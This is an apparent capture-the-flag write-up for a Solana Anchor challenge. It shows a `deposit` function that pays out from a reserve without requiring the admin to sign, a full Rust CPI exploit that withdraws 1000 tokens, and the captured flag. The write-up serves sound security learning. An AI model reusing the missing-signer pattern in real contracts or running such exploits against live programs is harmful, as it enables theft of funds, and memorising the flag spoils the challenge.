## Baby-1
The challenge is written in anchor and it is straight forward,though quality challenge,we spent decent time and alot of failed exploits as well :p

## Goal
balance of user == 1000

## Challenge 
The src file has an `initialize` function which we can fairly ignore.
when we look at `Deposit()` we observe that it infacts functions as a withdraw function. The vulnerability for this challenge lies within the `Deposit()` function let's dive into it
```rust
 pub fn deposit(ctx: Context<Deposit>, amount: u64) -> Result<()> {
        let reserve_bump = [*ctx.bumps.get("reserve").unwrap()];
        let signer_seeds = [
            b"RESERVE",
            reserve_bump.as_ref()
        ];
        let signer = &[&signer_seeds[..]];

        let withdraw_ctx = CpiContext::new_with_signer(
            ctx.accounts.token_program.to_account_info(),
            Transfer {
                from: ctx.accounts.reserve.to_account_info(),
                to: ctx.accounts.user_account.to_account_info(),
                authority: ctx.accounts.reserve.to_account_info()
            },
            signer
        );
        token::transfer(withdraw_ctx, amount)?;
        Ok(())
    }
```

```rust
#[derive(Accounts)]
pub struct Deposit<'info> {
    #[account(
        mut,
        seeds = [ b"CONFIG" ],
        bump,
        has_one = admin
    )]
    pub config: Account<'info, Config>,

    #[account(
        mut,
        seeds = [ b"RESERVE" ],
        bump,
        constraint = reserve.mint == mint.key(),
    )]
    pub reserve: Account<'info, TokenAccount>,

    #[account(
        mut,
        seeds = [b"account", user.key().as_ref()],
        bump,
        constraint = user_account.mint == mint.key(),
        constraint = user_account.owner == user.key(),
    )]
    pub user_account: Account<'info, TokenAccount>,

    pub mint: Account<'info, Mint>,

    #[account(mut)]
    pub admin: AccountInfo<'info>,
    
    #[account(mut)]
    pub user:  Signer<'info>,
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
}
```

we observe that `admin` is set to `Account<'info>` while `user` is set to `Signer`
meaning we can simply sign the tx as admin and withdraw as much tokens as we like

## Exploitation
`anchor init exploit`

```rust
use anchor_lang::prelude::*;

use anchor_lang::prelude::*;
use chall; // Import the chall crate

declare_id!("2MQDi1GYGUWNcG9KaN32eU2ug2e3k5GiozwRbGHxEwub");

#[program]
pub mod exploit {
    use super::*;

    pub fn withdraw_1000(ctx: Context<Withdraw1000>) -> Result<()> {
        let cpi_accounts = chall::cpi::accounts::Deposit {
            config: ctx.accounts.config.to_account_info(),
            reserve: ctx.accounts.reserve.to_account_info(),
            user_account: ctx.accounts.user_account.to_account_info(),
            mint: ctx.accounts.mint.to_account_info(),
            admin: ctx.accounts.admin.to_account_info(),
            user: ctx.accounts.user.to_account_info(),
            token_program: ctx.accounts.token_program.to_account_info(),
            system_program: ctx.accounts.system_program.to_account_info(),
            rent: ctx.accounts.rent.to_account_info(),
        };
        let cpi_ctx = CpiContext::new(ctx.accounts.chall.to_account_info(), cpi_accounts);
        chall::cpi::deposit(cpi_ctx, 1000)?; // Withdraw 1000 tokens
        Ok(())
    }
}

#[derive(Accounts)]
pub struct Withdraw1000<'info> {
    #[account(mut)]
    pub config: Account<'info, chall::Config>,
    #[account(mut)]
    pub reserve: Account<'info, anchor_spl::token::TokenAccount>,
    #[account(mut)]
    pub user_account: Account<'info, anchor_spl::token::TokenAccount>,
    pub mint: Account<'info, anchor_spl::token::Mint>,
    #[account(mut)]
    pub admin: AccountInfo<'info>,
    #[account(mut)]
    pub user: Signer<'info>,
    pub token_program: Program<'info, anchor_spl::token::Token>,
    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
    pub chall: Program<'info, chall::Chall>,
}
```
after setting up our exploit with remote js client we get the flag `idek{b391dba7-4766-4191-9117-55a1202c86d8}`
